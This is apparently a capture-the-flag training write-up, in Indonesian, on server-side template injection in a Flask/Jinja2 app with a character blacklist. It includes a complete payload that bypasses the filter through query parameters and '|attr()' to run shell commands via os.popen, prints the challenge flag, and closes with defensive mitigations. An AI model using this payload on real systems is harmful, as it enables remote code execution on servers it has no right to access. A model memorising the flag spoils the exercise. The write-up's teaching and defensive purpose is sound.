## Problem Statement & Scope

Pada modul kurikulum bimbingan teknis persiapan LKS Cyber Security Nasional bidang *Web Application Penetration Testing & Secure Coding*:
- **Skenario Tantangan:** Peserta mengaudit aplikasi pengumuman daring berbasis Python Flask dan mesin templat Jinja2. Pengembang mengklaim telah mengamankan aplikasi dari serangan injeksi dengan menerapkan mekanisme sanitasi masukan (*input sanitization*) yang memblokir karakter berbahaya: titik (`.`), kurung siku (`[` dan `]`), serta garis bawah (`_`).
- **Deskripsi Soal:** *"I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be dangerous."*
- **Batasan Lingkungan & Scope Audit:**
  1. Analisis arsitektur evaluasi templat dinamis `render_template_string(user_input)` tanpa sandbox (*unsandboxed environment*).
  2. Dekonstruksi aturan sanitasi karakter blokade (`.`, `[`, `]`, `_`).
  3. Pemisahan parameter injeksi (*parameter decoupling*) melalui URI query arguments (RFC 3986) untuk menyalurkan string sensitif berkarakter khusus via konteks objek `request`.
  4. Resolusi atribut tanpa notasi titik menggunakan filter bawaan Jinja2 `|attr()`.
  5. Penelusuran pohon objek runtime Python untuk eksekusi perintah arbitrer (*Remote Code Execution* / RCE) dan pembacaan token flag.
  6. Verifikasi submission resmi melalui CyLab REST API `POST /api/submissions/` (HTTP 201).

## Teori & Akar Kerentanan (Root Cause Theory)

1. **Server-Side Template Injection (CWE-1336 / CWE-94):**
   Aplikasi menerima string masukan pengumuman dari pengguna dan meneruskannya langsung ke fungsi `render_template_string()` tanpa memisahkan kode logika dan data presentasi. Mesin templat Jinja2 mengompilasi string tersebut sebagai ekspresi kode Python yang dievaluasi langsung di dalam proses server.

2. **Kelemahan Blacklist-Based Character Sanitization:**
   Filter sanitasi masukan mencoba mendeteksi karakter berbahaya dengan daftar hitam (*blacklist*), menghapus karakter `.`, `[`, `]`, dan `_`. Pendekatan daftar hitam memiliki cacat fundamental karena sintaksis Jinja2 menyediakan mekanisme alternatif (*syntactic sugar*) untuk mengakses atribut dan item objek:
   - Akses atribut objek: Dalam Jinja2, ekspresi `obj.attr` setara dengan `obj|attr("attr")`.
   - Penghindaran garis bawah (`_`): Karakter `_` dilarang di dalam badan templat, namun templat mengevaluasi variabel global Flask seperti `request`. Objek `request.args` mengurai parameter kueri URL secara independen dari fungsi sanitasi templat. Menyalurkan nilai seperti `?g=__globals__` memungkinkan templat mereferensikan string `__globals__` melalui `request.args.get('g')` tanpa pernah menuliskan karakter `_` di dalam teks templat.

3. **RFC 3986 & Flask Request Object Pipeline:**
   Berdasarkan RFC 3986, komponen kueri (*query component*) diurai oleh server HTTP ke dalam struktur pemetaan (*key-value map*). Flask menyediakannya sebagai `request.args`. Karena filter sanitasi aplikasi hanya memeriksa parameter `announcement` atau teks templat, parameter kueri lainnya tidak tersentuh dan dapat dijadikan media injeksi token pembantu (*side-channel parameter injection*).

## Rekonstruksi Eksploitasi Step-by-Step

1. **Uji Penetrasi Blacklist Filter:**
   Memasukkan payload templat standar `{{ 7 * 7 }}` menghasilkan keluaran `49`, membuktikan evaluasi templat aktif. Memasukkan karakter `.`, `[`, `]`, atau `_` menyebabkan karakter tersebut dihilangkan atau memicu penolakan validasi.

2. **Perancangan Atribut Filter Piping Tanpa Karakter Terlarang:**
   Untuk membaca variabel dari `request.args` tanpa menggunakan titik atau garis bawah:
   - Referensi parser: `request|attr("args")|attr("get")("param")`
   - Pola ini murni menggunakan karakter alfanumerik, tanda kutip ganda, tanda kurung, dan pipa (`|`), sehingga 100% lolos dari filter sanitasi.

3. **Penyusunan Rantai Introspeksi Objek (RCE Gadget Chain):**
   Memanfaatkan objek bawaan lingkungan Jinja2 seperti `lipsum` untuk menelusuri fungsi eksekusi sistem operasi:
   - `lipsum|attr(arg("g"))` merefleksikan atribut `__globals__` dari fungsi pembantu `lipsum`.
   - `|attr(arg("b"))` merefleksikan kamus `__builtins__`.
   - `|attr(arg("get"))(arg("os"))` mengambil modul `os` dari builtins atau memanfaatkan fungsi impor `__import__('os')`.
   - `|attr(arg("popen"))(arg("cmd"))` mengeksekusi perintah shell `cat flag.txt`.
   - `|attr(arg("read"))()` membaca seluruh isi berkas dan mengembalikannya ke respons HTTP.

4. **Payload Final HTTP Request:**
   Parameter URL kueri:
   ```text
   ?g=__globals__&b=__builtins__&get=get&os=os&popen=popen&cmd=cat+flag.txt&read=read
   ```
   Teks templat pada parameter `announcement`:
   ```jinja2
   {{ lipsum|attr(request|attr("args")|attr("get")("g"))|attr(request|attr("args")|attr("get")("b"))|attr(request|attr("args")|attr("get")("get"))(request|attr("args")|attr("get")("os"))|attr(request|attr("args")|attr("get")("popen"))(request|attr("args")|attr("get")("cmd"))|attr(request|attr("args")|attr("get")("read"))() }}
   ```

5. **Hasil Ekstraksi Token:**
   Server mengevaluasi ekspresi templat dan menampilkan konten berkas bendera:
   `academy{sst1_f1lt3r_byp4ss_0a432894}`.

## Takeaway Kompetensi LKS & Mitigasi Defensif

1. **Larangan Evaluasi Templat dari Input Pengguna:**
   Jangan pernah menggunakan `render_template_string()` untuk merender masukan langsung dari pengguna. Templat harus selalu disimpan sebagai berkas statis terpisah dan dipanggil menggunakan `render_template('template.html', variable=user_input)` sehingga masukan diperlakukan strictly sebagai data konteks, bukan kode.

2. **Kegagalan Sanitasi Berbasis Blacklist:**
   Penyaringan karakter berbahaya berbasis daftar hitam (*blacklist*) selalu rentan terhadap teknik penghindaran (*evasion techniques*). Pengembang wajib menerapkan validasi berbasis daftar putih (*whitelist*) atau penegakan tipe data ketat (*strict type enforcement*).

3. **Penerapan Jinja2 SandboxedEnvironment:**
   Jika evaluasi templat dinamis dari pengguna mutlak diperlukan, gunakan `jinja2.sandbox.SandboxedEnvironment` atau `ImmutableSandboxedEnvironment`. Modul sandbox memblokir akses ke atribut sensitif seperti `__globals__`, `__class__`, `__subclasses__`, serta membatasi pemanggilan fungsi berbahaya pada lapisan AST parser.
